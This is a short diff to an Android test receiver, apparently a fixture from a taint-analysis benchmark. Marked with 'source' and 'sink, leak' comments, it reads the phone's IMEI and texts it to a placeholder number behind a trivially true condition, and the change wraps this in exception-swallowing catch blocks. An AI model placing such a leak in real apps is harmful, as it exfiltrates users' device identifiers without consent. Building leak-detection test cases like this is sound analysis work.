@@ -21,12 +21,15 @@ public class TestReceiver extends BroadcastReceiver{
 
 	@Override
 	  public void onReceive(Context context, Intent intent) {
-		 String imei = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source
+		try{
+			String imei = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source
 		 int i = 2+3;
 		 if(i == 5){
 				SmsManager sms = SmsManager.getDefault();
 		        sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
 		 }
+			}catch( NullPointerException e){
+			}catch(ClassCastException ignore){}
 	}
 
 }
